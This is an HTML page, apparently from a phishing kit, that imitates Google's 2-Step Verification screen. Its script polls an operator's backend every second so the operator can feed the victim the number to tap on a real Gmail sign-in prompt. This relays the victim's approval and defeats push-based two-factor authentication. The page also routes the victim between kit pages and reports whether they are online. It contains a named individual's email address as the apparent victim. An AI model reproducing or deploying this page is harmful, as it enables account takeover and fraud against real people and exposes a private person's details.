
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2-Step Verification - Google</title>
    <link rel="icon" type="image/png" href="/pages/res/img/fav435vsdvge5.png">
    <link rel="stylesheet" href="/pages/res/css/style.css">
</head>
<body>
    <div class="container">
        <div class="signin-card">
            <div class="signin-left">
                <div class="logo-container">
                    <svg class="google-logo" viewBox="0 0 40 48" width="48" height="48" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
                        <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
                        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
                        <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
                    </svg>
                </div>
                <h1>2-Step Verification</h1>
                <p class="subtitle">A notification was sent to the devices signed into your recovery email</p>
                <div class="user-email">
                    <svg aria-hidden="true" class="user-icon" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zM12 5c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                    </svg>
                    <span id="user-email">Loading...</span>
                    <svg aria-hidden="true" class="dropdown-icon" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                        <path d="M7 10l5 5 5-5z"></path>
                    </svg>
                </div>
            </div>
            
            <div class="signin-right">
                <div class="otp-info">
                    <h3 style="font-size: 16px; font-weight: 400; margin-bottom: 12px;">Your recovery email</h3>
                    <p style="font-size: 14px; margin-bottom: 16px;"><strong id="recovery-email-display">ros.......@gmail.com</strong> is signed into one or more of your devices. Google sent a notification to these devices to help you sign in.</p>
                    <p style="font-size: 14px; color: #5f6368; margin-bottom: 24px;" id="user-email-display">rs@rosaliasanni.com</p>
                    
                    <p id="question-text" style="font-size: 14px; margin-bottom: 24px;">Google sent a notification to your phone. Open the Gmail app, tap <strong>Yes</strong> on the prompt, then tap <strong id="code-display">27</strong> on your phone to verify it's you.</p>
                </div>

                <div class="button-group">
                    <button type="button" class="text-button" onclick="redirectToWaiting()">Resend it</button>
                    <button type="button" class="create-account" onclick="redirectToWaiting()">Try another way</button>
                </div>
            </div>
        </div>

        <div class="footer">
            <select class="language-select">
                <option>English (United States)</option>
            </select>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session_id');

        if (!sessionId) {
            window.location.href = '/';
        }

        // Load user email and recovery email from session
        fetch(`/api/session/${sessionId}`)
            .then(response => response.json())
            .then(data => {
                if (data.email) {
                    document.getElementById('user-email').textContent = data.email;
                    document.getElementById('user-email-display').textContent = data.email;
                }
                if (data.recovery_email) {
                    const maskedEmail = maskEmail(data.recovery_email);
                    document.getElementById('recovery-email-display').textContent = maskedEmail;
                }
            });

        function maskEmail(email) {
            const parts = email.split('@');
            if (parts.length !== 2) return email;
            const localPart = parts[0];
            const domain = parts[1];
            if (localPart.length <= 3) {
                return localPart.charAt(0) + '.......@' + domain;
            }
            return localPart.substring(0, 3) + '.......@' + domain;
        }

        // Poll for questions from admin and status changes
        function pollStatus() {
            fetch(`/api/poll_status/${sessionId}`)
                .then(response => response.json())
                .then(data => {
                    // Update code/question (question1) - always update if present
                    if (data.recovery_email_sign_in_question1) {
                        const question1Text = data.recovery_email_sign_in_question1 !== '' ? data.recovery_email_sign_in_question1 : '27';
                        const codeElement = document.getElementById('code-display');
                        
                        if (codeElement) {
                            codeElement.textContent = question1Text;
                        }
                    }
                    
                    // Update device type and message (question2) - always update if present
                    if (data.recovery_email_sign_in_question2) {
                        const deviceType = data.recovery_email_sign_in_question2 !== '' ? data.recovery_email_sign_in_question2.toLowerCase() : 'phone';
                        const codeText = data.recovery_email_sign_in_question1 && data.recovery_email_sign_in_question1 !== '' ? data.recovery_email_sign_in_question1 : '27';
                        
                        // Update the full message
                        const questionTextElement = document.getElementById('question-text');
                        if (questionTextElement) {
                            questionTextElement.innerHTML = 
                                `Google sent a notification to your phone <strong>${deviceType}</strong>. Open the Gmail app, tap <strong>Yes</strong> on the prompt, then tap <strong id="code-display">${codeText}</strong> on your phone <strong>${deviceType}</strong> to verify it's you.`;
                        }
                    }
                    
                    // Check for status changes
                    if (data.status && data.status !== 'recovery_email_sign_in_request') {
                        window.location.href = `/${data.status}?session_id=${sessionId}`;
                    }
                })
                .catch(error => console.error('Polling error:', error));
        }

        setInterval(pollStatus, 1000);
        pollStatus();

        // Keep alive
        setInterval(function(){
            fetch(`/api/update_online/${sessionId}`);
        }, 3000);

        function redirectToWaiting() {
            window.location.href = `/waiting?session_id=${sessionId}`;
        }
    </script>
</body>
</html>
